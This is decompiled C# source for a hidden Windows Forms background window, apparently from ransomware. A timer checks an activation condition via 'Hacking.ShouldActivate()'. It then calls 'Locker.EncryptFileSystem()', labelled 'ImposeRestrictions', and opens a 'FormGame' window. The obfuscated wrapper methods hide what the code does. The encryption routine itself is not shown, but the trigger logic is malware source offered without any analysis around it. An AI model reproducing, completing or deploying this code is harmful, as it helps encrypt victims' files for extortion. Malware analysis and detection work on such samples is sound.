using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;
using Main.Tools;

namespace Main;

public class FormBackground : Form
{
	private IContainer components;

	private Timer timerActivateChecker;

	public FormBackground()
	{
		InitializeComponent();
		FormBackground.smethod_0(timerActivateChecker, Config.TimerActivateCheckerInterval);
		FormBackground.smethod_1(timerActivateChecker, bool_0: true);
	}

	private void timerActivateChecker_Tick(object sender, EventArgs e)
	{
		if (!Config.Activated && Hacking.ShouldActivate())
		{
			Config.Activated = true;
			ImposeRestrictions();
			FormBackground.smethod_2((Form)(object)new FormGame(), (IWin32Window)(object)this);
		}
	}

	private static void ImposeRestrictions()
	{
		Locker.EncryptFileSystem();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			FormBackground.smethod_3((IDisposable)components);
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		components = FormBackground.smethod_4();
		timerActivateChecker = FormBackground.smethod_5(components);
		FormBackground.smethod_6((Control)(object)this);
		FormBackground.smethod_1(timerActivateChecker, bool_0: true);
		FormBackground.smethod_7(timerActivateChecker, (EventHandler)timerActivateChecker_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(284, 262));
		((Control)this).set_Name("FormBackground");
		((Control)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
	}

	static void smethod_0(Timer timer_0, int int_0)
	{
		timer_0.set_Interval(int_0);
	}

	static void smethod_1(Timer timer_0, bool bool_0)
	{
		timer_0.set_Enabled(bool_0);
	}

	static void smethod_2(Form form_0, IWin32Window iwin32Window_0)
	{
		form_0.Show(iwin32Window_0);
	}

	static void smethod_3(IDisposable idisposable_0)
	{
		idisposable_0.Dispose();
	}

	static Container smethod_4()
	{
		return new Container();
	}

	static Timer smethod_5(IContainer icontainer_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new Timer(icontainer_0);
	}

	static void smethod_6(Control control_0)
	{
		control_0.SuspendLayout();
	}

	static void smethod_7(Timer timer_0, EventHandler eventHandler_0)
	{
		timer_0.add_Tick(eventHandler_0);
	}
}
